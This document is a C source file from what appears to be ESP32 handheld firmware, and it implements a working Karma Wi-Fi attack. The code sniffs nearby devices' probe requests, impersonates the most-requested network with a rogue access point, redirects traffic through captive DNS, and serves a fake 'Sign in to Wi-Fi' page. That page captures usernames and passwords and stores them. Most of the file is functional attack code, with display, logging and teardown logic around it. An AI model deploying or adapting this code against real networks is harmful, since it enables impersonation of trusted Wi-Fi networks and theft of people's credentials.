  char* body __attribute__((cleanup(c_free_pointer))) = NULL;
  if (!CaptivePortal_cpReadBody(req, &(body)))
    return httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid form");
  KarmaAttack_LoginEvent event = KarmaAttack_LoginEvent_INITIALIZER;
  div_copy_string(event.user, sizeof(event.user),
                  (CaptivePortal_cpFormValue(body, "username")).data);
  div_copy_string(event.password, sizeof(event.password),
                  (CaptivePortal_cpFormValue(body, "password")).data);
  if (KarmaAttack_login_queue) xQueueSend(KarmaAttack_login_queue, &event, 0);
  httpd_resp_set_type(req, "text/html");
  return httpd_resp_send(req, "<p>Connecting...</p>", HTTPD_RESP_USE_STRLEN);
}

static const char* KarmaAttack_kLoginHtml =
    "<!DOCTYPE html><html><head><meta name='viewport' "
    "content='width=device-width,initial-scale=1'>"
    "<title>Wi-Fi Login</title><style>"
    "body{font-family:Arial,sans-serif;text-align:center;padding:24px;"
    "background:#f2f2f2}"
    ".box{max-width:360px;margin:auto;padding:20px;background:#fff;border-"
    "radius:10px}"
    "input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}"
    "button{width:100%;padding:12px;background:#007BFF;color:#fff;border:0;"
    "border-radius:6px}"
    "</style></head><body><div class='box'><h2>Sign in to Wi-Fi</h2>"
    "<form method='POST' action='/login'>"
    "<input name='username' placeholder='Username' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form></div></body></html>";

static void KarmaAttack_ensurePortal(void) {
  if (KarmaAttack_s_portalUp) {
    return;
  }
  if (!KarmaAttack_login_queue)
    KarmaAttack_login_queue = xQueueCreate(4, sizeof(KarmaAttack_LoginEvent));
  captive_dns_start(&(KarmaAttack_s_dns), ((uint32_t)(network_ipv4(true))));
  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.stack_size = 12288;
  config.uri_match_fn = httpd_uri_match_wildcard;
  if (httpd_start(&KarmaAttack_s_server, &config) != ESP_OK) {
    captive_dns_stop(&(KarmaAttack_s_dns));
    return;
  }
  CaptivePortal_cpRegisterUri(KarmaAttack_s_server, "/login.html", HTTP_GET,
                              karma_login_page);
  CaptivePortal_cpRegisterUri(KarmaAttack_s_server, "/login", HTTP_POST,
                              KarmaAttack_karmaHandleLoginPost);
  CaptivePortal_cpRegisterUri(KarmaAttack_s_server, "/*", HTTP_GET,
                              KarmaAttack_karmaRedirectLogin);
  KarmaAttack_s_portalUp = true;
  KarmaAttack_logLine(TEXT("[*] Portal ready"), UI_DIM_TEXT);
}

static void KarmaAttack_applySoftAp(const char* ssid, uint8_t channel) {
  if (!ssid || !ssid[0]) {
    return;
  }
  if (channel < 1 || channel > 14) {
    channel = 6;
  }
  KarmaAttack_s_channel = channel;
  strncpy(KarmaAttack_s_apSsid, ssid, sizeof(KarmaAttack_s_apSsid) - 1);
  KarmaAttack_s_apSsid[sizeof(KarmaAttack_s_apSsid) - 1] = '\0';

  network_stop_ap(true);
  sys_sleep_ms(30);
  network_set_mode(WIFI_MODE_AP);
  network_start_ap(KarmaAttack_s_apSsid, NULL, KarmaAttack_s_channel);
  sys_sleep_ms(40);
  esp_wifi_set_channel(KarmaAttack_s_channel, WIFI_SECOND_CHAN_NONE);

  // Keep sniffing while AP is up.
  wifi_promiscuous_filter_t filt = {0};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(KarmaAttack_snifferCallback);
  esp_wifi_set_promiscuous(true);

  KarmaAttack_ensurePortal();
  KarmaAttack_s_headerDirty = true;

  char buf[48];
  snprintf(buf, sizeof(buf), "[*] AP -> %s", KarmaAttack_s_apSsid);
  KarmaAttack_logLine(TEXT(buf), ORANGE);
}

static void KarmaAttack_maybeSwitchAp(void) {
  if (!KarmaAttack_s_running || KarmaAttack_s_count <= 0) {
    return;
  }
  if (sys_monotonic_ms() - KarmaAttack_s_lastApSwitchMs <
      KarmaAttack_AP_SWITCH_MS) {
    return;
  }

  const int best = KarmaAttack_hottestIndex();
  if (best < 0) {
    return;
  }

  KarmaAttack_ProbeSsid e = KarmaAttack_ProbeSsid_INITIALIZER;
  portENTER_CRITICAL(&KarmaAttack_s_mux);
  e = KarmaAttack_s_list[best];
  portEXIT_CRITICAL(&KarmaAttack_s_mux);

  if (best == KarmaAttack_s_activeApIndex &&
      strcmp(KarmaAttack_s_apSsid, e.ssid) == 0) {
    KarmaAttack_s_lastApSwitchMs = sys_monotonic_ms();
    return;
  }

  KarmaAttack_s_activeApIndex = best;
  KarmaAttack_s_lastApSwitchMs = sys_monotonic_ms();
  KarmaAttack_applySoftAp(e.ssid, e.channel);
}

static void KarmaAttack_hopIfNeeded(void) {
  // Only hop while running with no learned SSIDs yet (learning phase).
  if (!KarmaAttack_s_running || KarmaAttack_s_count > 0) {
    return;
  }
  if (sys_monotonic_ms() - KarmaAttack_s_lastHopMs < KarmaAttack_HOP_MS) {
    return;
  }
  KarmaAttack_s_lastHopMs = sys_monotonic_ms();
  KarmaAttack_s_channel++;
  if (KarmaAttack_s_channel > 13) {
    KarmaAttack_s_channel = 1;
  }
  esp_wifi_set_channel(KarmaAttack_s_channel, WIFI_SECOND_CHAN_NONE);
  // Channel is not shown in the header — avoid dirtying UI on every hop.
}

static void KarmaAttack_scrollTerm(void) {
  const int cap = KarmaAttack_termVisibleLines();
  for (int i = 0; i < cap - 1; i++) {
    KarmaAttack_s_term[i] = KarmaAttack_s_term[i + 1];
    KarmaAttack_s_termColor[i] = KarmaAttack_s_termColor[i + 1];
  }
}

static void KarmaAttack_paintTermLine(int index) {
  const int cap = KarmaAttack_termVisibleLines();
  if (index < 0 || index >= KarmaAttack_s_termLines || index >= cap) {
    return;
  }
  const int y = KarmaAttack_TERM_TOP_Y + index * LINE_HEIGHT;
  if (y + LINE_HEIGHT > wifiContentBottom()) {
    return;
  }
  display_fill_rect(&(tft), KarmaAttack_CARD_MARGIN, y,
                    SCREEN_WIDTH - KarmaAttack_CARD_MARGIN * 2, LINE_HEIGHT,
                    TFT_BLACK);
  display_set_text_color_2(&(tft), KarmaAttack_s_termColor[index], TFT_BLACK);
  display_set_cursor(&(tft), KarmaAttack_CARD_MARGIN, y);
  display_print(&(tft), (KarmaAttack_s_term[index]).data);
}

static void KarmaAttack_redrawTerm(void) {
  const int cap = KarmaAttack_termVisibleLines();
  const int bodyBottom = wifiContentBottom();
  // Clear log zone once, then paint lines (avoids per-line gap flicker).
  const int h = bodyBottom - KarmaAttack_TERM_TOP_Y;
  if (h > 0) {
    display_fill_rect(&(tft), 0, KarmaAttack_TERM_TOP_Y, SCREEN_WIDTH, h,
                      TFT_BLACK);
  }
  for (int i = 0; i < KarmaAttack_s_termLines && i < cap; i++) {
    const int y = KarmaAttack_TERM_TOP_Y + i * LINE_HEIGHT;
    if (y + LINE_HEIGHT > bodyBottom) {
      break;
    }
    display_set_text_color_2(&(tft), KarmaAttack_s_termColor[i], TFT_BLACK);
    display_set_cursor(&(tft), KarmaAttack_CARD_MARGIN, y);
    display_print(&(tft), (KarmaAttack_s_term[i]).data);
  }
}

static void KarmaAttack_logLine(text_t text, uint16_t color) {
  if (!feature_active) {
    return;
  }
  const int cap = KarmaAttack_termVisibleLines();
  bool scrolled = false;
  if (KarmaAttack_s_termLines >= cap) {
    KarmaAttack_scrollTerm();
    KarmaAttack_s_termLines = cap - 1;
    scrolled = true;
  }
  KarmaAttack_s_term[KarmaAttack_s_termLines] = text;
  KarmaAttack_s_termColor[KarmaAttack_s_termLines] = color;
  KarmaAttack_s_termLines++;
  if (scrolled) {
    KarmaAttack_redrawTerm();
  } else {
    KarmaAttack_paintTermLine(KarmaAttack_s_termLines - 1);
  }
}

static void KarmaAttack_flushPendingLog(void) {
  if (!KarmaAttack_s_logPending) {
    return;
  }
  KarmaAttack_s_logPending = false;
  KarmaAttack_logLine(TEXT(KarmaAttack_s_pendingLog),
                      KarmaAttack_s_pendingLogColor);
}

static void KarmaAttack_updateHeader(bool force) {
  if (force) {
    KarmaAttack_invalidateHeaderCache();
  }
  KarmaAttack_tickBeaconRate();

  // Draw static chrome once. Never wipe this region on later force refreshes.
  if (!KarmaAttack_s_chromeDrawn) {
    display_fill_rect(&(tft), 0, KarmaAttack_CARDS_Y, SCREEN_WIDTH,
                      KarmaAttack_TERM_TOP_Y - KarmaAttack_CARDS_Y, TFT_BLACK);
    KarmaAttack_drawStatCardsChrome();
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), KarmaAttack_CARD_MARGIN,
                       KarmaAttack_ACT_LABEL_Y);
    display_print(&(tft), "ACTIVITY");
    display_draw_fast_h_line(&(tft), 68, KarmaAttack_ACT_LABEL_Y + 4,
                             SCREEN_WIDTH - KarmaAttack_CARD_MARGIN - 68,
                             UI_LINE);
    KarmaAttack_s_chromeDrawn = true;
  }

  char v0[10];
  char v1[10];
  char v2[10];
  const uint8_t clients = (uint8_t)network_ap_client_count();
  snprintf(v0, sizeof(v0), "%d", KarmaAttack_s_count);
  snprintf(v1, sizeof(v1), "%u",
           (unsigned)(KarmaAttack_s_running ? KarmaAttack_s_beaconRate : 0));
  snprintf(v2, sizeof(v2), "%u", (unsigned)clients);
  KarmaAttack_paintStatCardValue(0, v0,
                                 KarmaAttack_s_count > 0 ? WHITE : UI_DIM_TEXT);
  KarmaAttack_paintStatCardValue(
      1, v1,
      (KarmaAttack_s_running && KarmaAttack_s_beaconRate > 0) ? ORANGE
                                                              : UI_DIM_TEXT);
  KarmaAttack_paintStatCardValue(2, v2, clients > 0 ? GREEN : UI_DIM_TEXT);

  // Keep AP/status text stable — no live probe counters (those caused flicker).
  char apLine[52];
  uint16_t apColor = UI_DIM_TEXT;
  if (KarmaAttack_s_apSsid[0] && KarmaAttack_s_running) {
    const bool placeholder = (strcmp(KarmaAttack_s_apSsid, "Karma") == 0 &&
                              KarmaAttack_s_count == 0);
    if (placeholder) {
      snprintf(apLine, sizeof(apLine), "Waiting for probes...");
      apColor = UI_DIM_TEXT;
    } else {
      char ssidShort[22];
      KarmaAttack_truncSsid(ssidShort, sizeof(ssidShort), KarmaAttack_s_apSsid,
                            18);
      snprintf(apLine, sizeof(apLine), "AP: %s", ssidShort);
      apColor = FEATURE_TEXT;
    }
  } else if (KarmaAttack_s_running) {
    snprintf(apLine, sizeof(apLine), "Listening for probes...");
    apColor = UI_TEXT;
  } else if (KarmaAttack_s_count > 0) {
    snprintf(apLine, sizeof(apLine), "Ready - press Start");
    apColor = UI_TEXT;
  } else {
    snprintf(apLine, sizeof(apLine), "No SSIDs - Start or Add");
    apColor = UI_DIM_TEXT;
  }
  KarmaAttack_paintInfoRow(KarmaAttack_AP_Y, KarmaAttack_s_hdrCacheAp,
                           sizeof(KarmaAttack_s_hdrCacheAp), apLine, apColor,
                           SCREEN_WIDTH - KarmaAttack_CARD_MARGIN * 2);

  char topLine[52];
  uint16_t topColor = UI_DIM_TEXT;
  int wantBars = -1;
  KarmaAttack_ProbeSsid best = KarmaAttack_ProbeSsid_INITIALIZER;
  if (KarmaAttack_bestSsidSnapshot(&(best))) {
    char ssidShort[20];
    KarmaAttack_truncSsid(ssidShort, sizeof(ssidShort), best.ssid, 16);
    snprintf(topLine, sizeof(topLine), "Top: %s", ssidShort);
    topColor = KarmaAttack_s_running ? ORANGE : UI_TEXT;
    wantBars = KarmaAttack_rssiBars(best.rssi);
  } else if (KarmaAttack_s_running) {
    snprintf(topLine, sizeof(topLine), "Top: waiting...");
  } else {
    snprintf(topLine, sizeof(topLine), "Add = seed a test SSID");
  }

  // Full-row clear keeps AP / Top from stacking when text changes.
  const bool topChanged = KarmaAttack_paintInfoRow(
      KarmaAttack_TOP_Y, KarmaAttack_s_hdrCacheTop,
      sizeof(KarmaAttack_s_hdrCacheTop), topLine, topColor,
      SCREEN_WIDTH - KarmaAttack_CARD_MARGIN - KarmaAttack_BAR_ZONE_W);
  if (force || topChanged) {
    KarmaAttack_s_barsCache = -2;
  }
  if (wantBars != KarmaAttack_s_barsCache) {
    const int barX = SCREEN_WIDTH - KarmaAttack_BAR_ZONE_W + 2;
    // Row already cleared when text changed; only clear bar zone on bar-only
    // updates.
    if (!topChanged) {
      display_fill_rect(&(tft), barX, KarmaAttack_TOP_Y,
                        KarmaAttack_BAR_ZONE_W - 2, KarmaAttack_INFO_ROW_H,
                        TFT_BLACK);
    }
    if (wantBars >= 0) {
      KarmaAttack_drawSignalBars(barX, KarmaAttack_TOP_Y + 12, wantBars);
    }
    KarmaAttack_s_barsCache = wantBars;
  }

  KarmaAttack_s_headerDirty = false;
}

static void KarmaAttack_drawDashboard(bool full) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  if (full) {
    wifiClearBody(TFT_BLACK);
    KarmaAttack_invalidateHeaderCache();
    KarmaAttack_s_chromeDrawn = false;
  }
  KarmaAttack_updateHeader(true);
  if (full) {
    KarmaAttack_redrawTerm();
  }
  KarmaAttack_updateNavLabels(true);
}

static void KarmaAttack_resetBeaconStats(void) {
  KarmaAttack_s_beaconsSent = 0;
  KarmaAttack_s_beaconRate = 0;
  KarmaAttack_s_beaconsAtMark = 0;
  KarmaAttack_s_rateMarkMs = sys_monotonic_ms();
}

static void KarmaAttack_clearLearned(void) {
  portENTER_CRITICAL(&KarmaAttack_s_mux);
  KarmaAttack_s_count = 0;
  portEXIT_CRITICAL(&KarmaAttack_s_mux);
  KarmaAttack_s_beaconIdx = 0;
  KarmaAttack_s_activeApIndex = -1;
  KarmaAttack_resetBeaconStats();
  KarmaAttack_s_probeFrames = 0;
  KarmaAttack_s_namedProbes = 0;
  KarmaAttack_s_apSsid[0] = '\0';
  KarmaAttack_logLine(TEXT("[*] Cleared learned SSIDs"), UI_WARN);
  KarmaAttack_s_headerDirty = true;
  KarmaAttack_updateHeader(true);
}

static void KarmaAttack_stopKarma(void) {
  const bool wasRunning = KarmaAttack_s_running;
  KarmaAttack_s_running = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  KarmaAttack_stopPortal();
  network_stop_ap(true);
  KarmaAttack_s_activeApIndex = -1;
  KarmaAttack_s_apSsid[0] = '\0';
  KarmaAttack_s_headerDirty = true;
  if (wasRunning) {
    KarmaAttack_logLine(TEXT("[*] Stopped"), UI_WARN);
  }
  KarmaAttack_updateHeader(true);
  KarmaAttack_updateNavLabels(true);
}

static void KarmaAttack_startKarma(void) {
  if (KarmaAttack_s_running) {
    KarmaAttack_stopKarma();
  } else {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    KarmaAttack_stopPortal();
    network_stop_ap(true);
  }

  network_set_mode(WIFI_MODE_AP);
  sys_sleep_ms(40);
  // Placeholder AP until a probed SSID is learned.
  network_start_ap("Karma", NULL, KarmaAttack_s_channel);
  sys_sleep_ms(40);
  strncpy(KarmaAttack_s_apSsid, "Karma", sizeof(KarmaAttack_s_apSsid) - 1);
  KarmaAttack_s_apSsid[sizeof(KarmaAttack_s_apSsid) - 1] = '\0';

  wifi_promiscuous_filter_t filt = {0};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_channel(KarmaAttack_s_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(KarmaAttack_snifferCallback);
  esp_wifi_set_promiscuous(true);

  KarmaAttack_ensurePortal();

  KarmaAttack_s_running = true;
  KarmaAttack_s_lastHopMs = sys_monotonic_ms();
  KarmaAttack_s_lastApSwitchMs = 0;
  KarmaAttack_s_lastBeaconMs = 0;
  KarmaAttack_resetBeaconStats();
  KarmaAttack_s_headerDirty = true;

  KarmaAttack_logLine(TEXT("[+] LIVE - answering probes"), GREEN);
  if (KarmaAttack_s_count > 0) {
    KarmaAttack_maybeSwitchAp();
  } else {
    KarmaAttack_logLine(TEXT("[*] Waiting for probes..."), UI_DIM_TEXT);
  }
  KarmaAttack_updateHeader(true);
  KarmaAttack_updateNavLabels(true);
}

static void KarmaAttack_promptAddSsid(void) {
  const bool wasRunning = KarmaAttack_s_running;
  if (wasRunning) {
    // Keep radio up but pause UI takeover.
  }

  OnScreenKeyboardConfig cfg = OnScreenKeyboardConfig_INITIALIZER;
  cfg.titleLine1 = "[!] Seed SSID for Karma";
  cfg.titleLine2 = "Learned list + beacons (Shuffle ok)";
  osKeyboardUseStandardLayout(&(cfg));
  cfg.maxLen = 31;
  cfg.shuffleNames = KarmaAttack_kTestSsids;
  cfg.shuffleCount = KarmaAttack_kTestSsidCount;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = "Shuffle";
  cfg.okLabel = "OK";
  cfg.enableShuffle = true;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "SSID cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(&(cfg), TEXT("TestKarma"));
  KarmaAttack_s_uiDrawn = false;

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  KarmaAttack_runUI();
  KarmaAttack_drawDashboard(true);

  if (r.accepted && strlen((r.text).data) > 0) {
    KarmaAttack_recordProbeSsid((r.text).data, -40, KarmaAttack_s_channel);
    KarmaAttack_flushPendingLog();
    char buf[48];
    snprintf(buf, sizeof(buf), "[+] seeded %.32s", (r.text).data);
    KarmaAttack_logLine(TEXT(buf), GREEN);
    if (wasRunning || KarmaAttack_s_running) {
      KarmaAttack_s_lastApSwitchMs = 0;
      KarmaAttack_maybeSwitchAp();
    } else {
      KarmaAttack_logLine(TEXT("[*] Press Start to beacon/answer"), UI_TEXT);
    }
    KarmaAttack_s_headerDirty = true;
    KarmaAttack_updateHeader(false);
  } else {
    KarmaAttack_logLine(TEXT("[*] Add cancelled"), UI_DIM_TEXT);
  }
  KarmaAttack_updateNavLabels(false);
}

static void KarmaAttack_handleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - KarmaAttack_s_lastBtnMs < KarmaAttack_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (KarmaAttack_s_running) {
      KarmaAttack_stopKarma();
    } else {
      KarmaAttack_startKarma();
    }
    KarmaAttack_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    KarmaAttack_clearLearned();
    KarmaAttack_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    KarmaAttack_promptAddSsid();
    KarmaAttack_s_lastBtnMs = now;
    return;
  }
}

static void KarmaAttack_runUI(void) {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!KarmaAttack_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    KarmaAttack_s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        KarmaAttack_clearLearned();
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void KarmaAttack_teardown(void) {
  KarmaAttack_stopKarma();
  network_set_mode(WIFI_MODE_NULL);
  sys_sleep_ms(20);
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(true, true);
}

void KarmaAttack_karmaSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  KarmaAttack_s_uiDrawn = false;
  KarmaAttack_s_running = false;
  KarmaAttack_s_count = 0;
  KarmaAttack_s_termLines = 0;
  KarmaAttack_s_probeFrames = 0;
  KarmaAttack_s_namedProbes = 0;
  KarmaAttack_s_credCount = 0;
  KarmaAttack_s_lastUser[0] = '\0';
  KarmaAttack_s_lastPass[0] = '\0';
  KarmaAttack_s_apSsid[0] = '\0';
  KarmaAttack_s_activeApIndex = -1;
  KarmaAttack_s_channel = 6;
  KarmaAttack_s_logPending = false;
  KarmaAttack_s_headerDirty = true;
  KarmaAttack_s_lastClients = 0;
  KarmaAttack_s_navDrawn = false;
  KarmaAttack_s_chromeDrawn = false;
  KarmaAttack_resetBeaconStats();
  KarmaAttack_invalidateHeaderCache();

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  KarmaAttack_runUI();

  KarmaAttack_drawDashboard(true);
  KarmaAttack_logLine(TEXT("[*] Answers probe SSIDs"), UI_TEXT);
  KarmaAttack_logLine(TEXT("[*] Start, or Add to seed"), UI_DIM_TEXT);
}

void KarmaAttack_karmaLoop(void) {
  if (feature_exit_requested) {
    KarmaAttack_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    KarmaAttack_teardown();
    feature_exit_requested = true;
    return;
  }

  KarmaAttack_handleNavButtons();
  KarmaAttack_flushPendingLog();
  KarmaAttack_hopIfNeeded();
  updateStatusBar();
  KarmaAttack_runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    KarmaAttack_teardown();
    return;
  }

  if (KarmaAttack_s_running) {
    KarmaAttack_maybeSwitchAp();
    KarmaAttack_sendNextBeacon();
    if (KarmaAttack_s_portalUp) {
      captive_dns_poll(&(KarmaAttack_s_dns));
      KarmaAttack_LoginEvent event = KarmaAttack_LoginEvent_INITIALIZER;
      if (KarmaAttack_login_queue &&
          xQueueReceive(KarmaAttack_login_queue, &event, 0) == pdTRUE) {
        snprintf(KarmaAttack_s_lastUser, sizeof(KarmaAttack_s_lastUser),
                 "%.31s", event.user);
        snprintf(KarmaAttack_s_lastPass, sizeof(KarmaAttack_s_lastPass),
                 "%.31s", event.password);
        ++KarmaAttack_s_credCount;
        KarmaAttack_logLine(TEXT("Portal form received"), ORANGE);
      }
    }

    const uint8_t clients = (uint8_t)network_ap_client_count();
    if (clients != KarmaAttack_s_lastClients) {
      if (clients > KarmaAttack_s_lastClients) {
        KarmaAttack_logLine(TEXT("[!] Client joined"), ORANGE);
      } else {
        KarmaAttack_logLine(TEXT("[*] Client left"), UI_DIM_TEXT);
      }
      KarmaAttack_s_lastClients = clients;
      KarmaAttack_s_headerDirty = true;
    }
  }

  const uint32_t now = sys_monotonic_ms();
  if (KarmaAttack_s_headerDirty ||
      now - KarmaAttack_s_lastStatsMs > KarmaAttack_STATS_MS) {
    KarmaAttack_updateHeader(false);
    KarmaAttack_s_lastStatsMs = now;
  }
}

void stopForegroundWifi(void) {
  CaptivePortal_stopAttack();
  CaptivePortal_stopWebServer();
  KarmaAttack_stopKarma();
  KarmaAttack_stopPortal();
  FirmwareUpdate_fwStopHttpServer();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  PacketMonitor_pcapStop();
  esp_wifi_scan_stop();
  network_stop_ap(false);
}
